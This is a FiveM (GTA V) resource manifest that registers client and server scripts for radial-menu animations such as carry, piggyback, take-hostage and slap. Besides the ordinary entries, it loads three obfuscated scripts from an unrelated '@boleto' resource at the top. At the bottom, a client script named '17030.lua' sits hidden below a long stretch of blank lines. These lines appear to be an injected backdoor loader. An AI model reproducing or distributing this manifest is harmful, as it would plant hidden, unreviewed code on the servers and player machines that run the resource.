shared_script '@boleto/shared_fg-obfuscated.lua'
shared_script '@boleto/ai_module_fg-obfuscated.lua'
shared_script '@boleto/ai_module_fg-obfuscated.js'
fx_version 'adamant'

game 'gta5'

client_script {
    "config.lua",
    "radialmenu.lua",
    "animations.lua",
	
	"main.lua",
	
	--weapon delay
	"client/holsterweapon.lua",
	
	--handsup and fingerpoint
	"client/vk_handsup_pointfinger_client.lua",
	
	--rubbertoe98 animation https://github.com/rubbertoe98
	"client/cl_piggyback.lua",
	"client/cl_carry.lua",
	"client/cl_takehostage.lua",
	
	--other
	"client/airshot.lua",
	"client/hideTrunk.lua",
	
	--other slap
	"client/cl_Slapping.lua",
	"client/cl_spotlight.lua",	
}

server_script {
	"server/sv_piggyback.lua",
	"server/sv_carry.lua",
	"server/sv_takehostage.lua",
	
	--other slap
	"server/sv_slap.lua",
	"server/sv_spotlight.lua",	
}

ui_page "html/menu.html"

files {
	"html/menu.html",
	"html/raphael.min.js",
	"html/wheelnav.js",
	"html/wheelnav.min.js",
	"html/RB-Bold.ttf",
}

export 'isPlayerDoingAnimation2'






































client_script "17030.lua"